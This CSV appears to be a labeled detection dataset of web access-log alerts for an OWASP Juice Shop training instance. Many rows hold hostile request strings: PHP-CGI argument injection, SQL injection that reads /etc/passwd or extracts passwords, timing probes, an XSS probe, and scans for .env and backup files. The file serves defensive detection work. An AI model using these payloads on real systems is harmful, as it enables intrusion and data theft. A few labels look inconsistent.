log_id,full_log,data.protocol,data.url,decoder.name,rule.description,rule.groups,rule.id,rule.level
264,"10.42.0.234 - - [12/May/2026:15:32:42 +0000] ""POST /application/node_modules/express/lib/router/vendor.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/vendor.js?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1217,"10.42.1.207 - - [12/May/2026:15:32:55 +0000] ""POST /rest/captcha?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/rest/captcha?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1214,"10.42.0.234 - - [12/May/2026:16:07:31 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
1047,"10.42.1.207 - - [12/May/2026:15:32:41 +0000] ""POST /application/node_modules/express/lib/router/index.js:280:10?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/index.js:280:10?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
135,"10.42.1.207 - - [12/May/2026:16:09:05 +0000] ""GET /rest/captcha/.env HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/captcha/.env,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
789,"10.42.0.234 - - [12/May/2026:16:18:34 +0000] ""GET /rest/products/search.backup HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/products/search.backup,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
255,"10.42.1.207 - - [12/May/2026:15:32:47 +0000] ""POST /assets/public/images/products/green_smoothie.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/assets/public/images/products/green_smoothie.jpg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
867,"10.42.0.234 - - [12/May/2026:16:13:37 +0000] ""GET /api/.svn/text-base/Challenges.svn-base HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/.svn/text-base/Challenges.svn-base,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
571,"10.42.2.150 - - [12/May/2026:15:33:49 +0000] ""POST /rest/user/login HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
417,"10.42.0.234 - - [12/May/2026:16:11:25 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
3,"10.42.0.234 - - [12/May/2026:16:13:47 +0000] ""GET /api HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
540,"10.42.0.234 - - [12/May/2026:16:11:30 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
446,"10.42.1.195 - - [13/May/2026:13:10:40 +0000] ""GET /api/Users?email=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20 HTTP/1.1"" 401 234 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36""",GET,/api/Users?email=%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
1400,"10.42.2.150 - - [12/May/2026:14:56:09 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
612,"10.42.2.150 - - [12/May/2026:16:21:28 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1374,"10.42.1.207 - - [12/May/2026:16:12:58 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
678,"10.42.1.207 - - [12/May/2026:16:18:14 +0000] ""GET /rest/languages.bak HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/languages.bak,web-accesslog,Suspicious URL access.,"[""web"",""appsec"",""attack""]",31516,6
971,"10.42.2.150 - - [12/May/2026:15:31:54 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
24,"10.42.2.150 - - [12/May/2026:16:18:37 +0000] ""GET /rest%20-%20Copy%20(2)/products HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest%20-%20Copy%20(2)/products,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
558,"10.42.2.150 - - [12/May/2026:16:20:28 +0000] ""TRACE /api/Quantitys HTTP/1.1"" 500 - ""-"" ""-""",TRACE,/api/Quantitys,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
95,"10.42.2.150 - - [12/May/2026:15:34:41 +0000] ""GET /redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+and+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1"" 302 232 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop%27+and+0+in+%28select+sleep%2815%29+%29+--+,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
694,"10.42.1.94 - - [13/May/2026:14:59:16 +0000] ""GET /rest/admin/application-configuration?key=1%27%20WAITFOR%20DELAY%20%270%3A0%3A10%27--%20 HTTP/1.1"" 500 543 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15""",GET,/rest/admin/application-configuration?key=1%27%20WAITFOR%20DELAY%20%270%3A0%3A10%27--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
602,"10.42.0.234 - - [12/May/2026:15:32:25 +0000] ""GET /api/Challenges?-s HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/api/Challenges?-s,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1236,"10.42.0.234 - - [12/May/2026:15:32:40 +0000] ""POST /application/node_modules/express/lib/router/assets/public/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/node_modules/express/lib/router/assets/public/assets/public?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
129,"10.42.2.150 - - [12/May/2026:16:07:41 +0000] ""GET /rest/admin HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/admin,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1133,"10.42.2.77 - - [12/May/2026:18:51:57 +0000] ""GET /rest/basket HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0""",GET,/rest/basket,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
704,"10.42.0.234 - - [12/May/2026:15:32:37 +0000] ""POST /application?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
58,"10.42.0.234 - - [12/May/2026:16:07:32 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
234,"10.42.0.99 - - [13/May/2026:00:26:12 +0000] ""GET /api/Feedbacks?author=0%20UNION%20SELECT%20load_file%28%27%2Fetc%2Fpasswd%27%29--%20 HTTP/1.1"" 500 182 ""https://juice-shop.vtsolutions.it/"" ""python-requests/2.32.3""",GET,/api/Feedbacks?author=0%20UNION%20SELECT%20load_file%28%27%2Fetc%2Fpasswd%27%29--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
803,"10.42.0.234 - - [12/May/2026:15:34:37 +0000] ""GET /api/Challenges/?name=Score+Board%22+where+0+in+%28select+sleep%2815%29+%29+--+ HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=Score+Board%22+where+0+in+%28select+sleep%2815%29+%29+--+,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
423,"10.42.0.234 - - [12/May/2026:16:11:31 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
70,"10.42.0.234 - - [12/May/2026:16:22:46 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
298,"10.42.1.207 - - [12/May/2026:16:06:53 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
254,"10.42.1.207 - - [12/May/2026:16:06:51 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
441,"10.42.3.18 - - [12/May/2026:19:32:14 +0000] ""POST /rest/user/login HTTP/1.1"" 401 91 ""https://juice-shop.vtsolutions.it/"" ""curl/8.5.0""",POST,/rest/user/login,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
370,"10.42.0.234 - - [12/May/2026:16:11:25 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4""",GET,/rest,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31162,10
1060,"10.42.0.234 - - [12/May/2026:16:07:32 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
710,"10.42.0.234 - - [12/May/2026:16:08:33 +0000] ""GET /api HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
928,"10.42.2.150 - - [12/May/2026:16:17:55 +0000] ""GET /rest/admin/application-version.old HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest/admin/application-version.old,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
438,"10.42.2.150 - - [12/May/2026:16:18:16 +0000] ""GET /rest%20-%20Copy%20(3)/languages HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest%20-%20Copy%20(3)/languages,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
437,"10.42.1.207 - - [12/May/2026:15:34:43 +0000] ""GET /api/Challenges/?name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ HTTP/1.1"" 200 30 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/api/Challenges/?name=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,web-accesslog,A web attack returned code 200 (success).,"[""web"",""accesslog"",""attack""]",31106,6
488,"10.42.1.207 - - [12/May/2026:15:34:44 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31151,10
709,"10.42.0.234 - - [12/May/2026:16:07:31 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
42,"10.42.0.234 - - [12/May/2026:16:07:59 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
431,"10.42.0.234 - - [12/May/2026:15:32:52 +0000] ""POST /kr.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/kr.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
843,"10.42.2.77 - - [13/May/2026:09:09:33 +0000] ""GET /rest/user/whoami HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""python-requests/2.32.3""",GET,/rest/user/whoami,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
179,"10.42.0.234 - - [12/May/2026:16:09:19 +0000] ""POST /rest/user/login HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1252,"10.42.1.207 - - [12/May/2026:16:18:42 +0000] ""GET /rest/products/search?q=%27%20OR%20SUBSTRING%28password%2C1%2C1%29%3D%27a%27--%20 HTTP/1.1"" 200 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0""",GET,/rest/products/search?q=%27%20OR%20SUBSTRING%28password%2C1%2C1%29%3D%27a%27--%20,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
317,"10.42.0.234 - - [12/May/2026:15:32:56 +0000] ""POST /rest/user/whoami?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/rest/user/whoami?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
1379,"10.42.2.150 - - [12/May/2026:15:34:49 +0000] ""GET /redirect?to=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,web-accesslog,SQL injection attempt.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31103,7
1079,"10.42.2.150 - - [12/May/2026:15:31:56 +0000] ""POST /rest/user/login HTTP/1.1"" 401 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/rest/user/login,web-accesslog,Web server 400 error code.,"[""web"",""accesslog"",""attack""]",31101,5
675,"10.42.2.150 - - [12/May/2026:15:32:03 +0000] ""GET /rest/user HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest/user,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
671,"10.42.1.207 - - [12/May/2026:16:17:52 +0000] ""GET /rest%20-%20Copy%20(2) HTTP/1.1"" 500 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",GET,/rest%20-%20Copy%20(2),web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1369,"10.42.0.234 - - [12/May/2026:16:07:17 +0000] ""GET /rest HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/rest,web-accesslog,Web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31122,5
1494,"10.42.1.207 - - [12/May/2026:15:32:37 +0000] ""POST /application/build/routes/assets/public/favicon_js.ico?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/application/build/routes/assets/public/favicon_js.ico?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
570,"10.42.1.207 - - [12/May/2026:16:04:53 +0000] ""GET /redirect?to=%3Cscript%3Ealert(5397)%3C/script%3E HTTP/1.1"" 406 - ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%3Cscript%3Ealert(5397)%3C/script%3E,web-accesslog,XSS (Cross Site Scripting) attempt.,"[""web"",""accesslog"",""attack""]",31105,6
753,"10.42.1.207 - - [12/May/2026:15:34:49 +0000] ""GET /redirect?to=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+ HTTP/1.1"" 406 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",GET,/redirect?to=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,web-accesslog,Multiple SQL injection attempts from same source ip.,"[""web"",""accesslog"",""attack"",""sql_injection""]",31152,10
973,"10.42.1.207 - - [13/May/2026:07:09:13 +0000] ""GET /api/Users HTTP/1.1"" 500 - ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36""",GET,/api/Users,web-accesslog,Multiple web server 500 error code (Internal Error).,"[""web"",""accesslog"",""system_error""]",31151,10
1213,"10.42.3.18 - - [13/May/2026:12:43:58 +0000] ""POST /api/Users/1 HTTP/1.1"" 400 162 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0""",POST,/api/Users/1,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
1464,"10.42.0.234 - - [12/May/2026:15:32:52 +0000] ""POST /il.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1"" 200 - ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36""",POST,/il.svg?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input,web-accesslog,PHP CGI-bin vulnerability attempt.,"[""web"",""accesslog"",""attack""]",31110,6
644,"10.42.3.18 - - [13/May/2026:02:22:43 +0000] ""GET /api/Feedbacks.bak HTTP/1.1"" 404 26 ""https://juice-shop.vtsolutions.it/"" ""Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)""",POST,/api/Feedbacks.bak,web-accesslog,Multiple web server 400 error codes from same source ip.,"[""web"",""accesslog"",""web_scan"",""recon""]",31166,10
